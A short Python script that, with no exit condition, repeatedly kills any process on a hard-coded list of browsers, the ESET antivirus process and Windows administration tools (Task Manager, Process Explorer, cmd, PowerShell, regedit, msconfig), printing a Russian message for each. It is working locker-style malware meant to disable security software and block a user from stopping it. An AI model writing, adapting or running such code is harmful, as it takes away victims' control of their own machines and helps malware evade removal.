import psutil

process_names = [
    "chrome.exe",
    "opera.exe",
    "mspaint.exe",
    "firefox.exe",
    "ProcessExplorer.exe",
    "ProcessHacker.exe",
    "iexplore.exe",
    "Notepad.exe",
    "notepad.exe",
    "yandex.exe",
    "browser.exe",
    "eset.exe",
    "protogent.exe",
    "rundll32.exe",
    "rundll.exe",
    "dilhost.exe",
    "superaltf4.exe",
    "msedge.exe",
    "microsoftedge.exe",
    "mrsmjrgui.exe",
    "cmd.exe",
    "taskmgr.exe",
    "Taskmgr.exe",
    "regedit.exe",
    "powershell.exe",
    "perfmon.exe",
    "SystemSettings.exe",
    "osk.exe",
    "mmc.exe",
    "msconfig.exe",
    "UserAccountControlSettings.exe"
]

stop_processes = False

while not stop_processes:
    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'] in process_names:
                proc.kill()
                print(f"Процесс {proc.info['name']} был закрыт.")
        except:
            pass
